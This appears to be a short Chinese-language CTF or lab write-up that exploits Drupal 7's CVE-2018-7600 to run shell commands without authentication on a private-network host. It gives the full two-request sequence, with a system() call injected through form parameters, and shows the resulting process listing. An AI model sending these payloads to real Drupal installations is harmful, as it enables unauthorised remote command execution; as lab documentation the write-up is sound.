一个**drupal7的cms**，存在的是**CVE-2018-7600漏洞**

**可以在没有用户认证的情况下执行命令**

**触发点在 `http://172.18.0.2/user/register?q=user/password`**

**POST发送**

```nginx
http://172.18.0.2/user/register?q=user/password&name[%23post_render][]=system&name[%23markup]=ps aux|grep "VehicleController"&name[%23type]=markup

body内容：
form_id=user_pass&_triggering_element_name=name
```

>   发送完请求后查看源代码找到 `name`为`form_build_id`的`value`的值

```html
<input type="hidden" name="form_build_id" value="form-hE-PdbjF1tCsOzbN_531jj-8Mswgdpi9fMQMVozOAF4" />
```

**再次发送请求包**

```nginx
http://172.18.0.2/?q=file/ajax/name/%23value/form-hE-PdbjF1tCsOzbN_531jj-8Mswgdpi9fMQMVozOAF4

body内容：
form_build_id=form-hE-PdbjF1tCsOzbN_531jj-8Mswgdpi9fMQMVozOAF4
```

**然后得到`VehicleController`程序的进程号**

```nginx
root        5391  0.1  0.1 1531648 9572 ?        Sl   Apr29   5:39 ./VehicleController
www-data    9935  0.0  0.0   2604   580 ?        S    11:52   0:00 sh -c ps aux|grep "VehicleController"
www-data    9937  0.0  0.0   5336   764 ?        S    11:52   0:00 grep VehicleController
[{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"E79vniZEE-zzfgpitlig9usm6wMHUw5MFIux499Lqt4"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"E79vniZEE-zzfgpitlig9usm6wMHUw5MFIux499Lqt4"}}}]

```

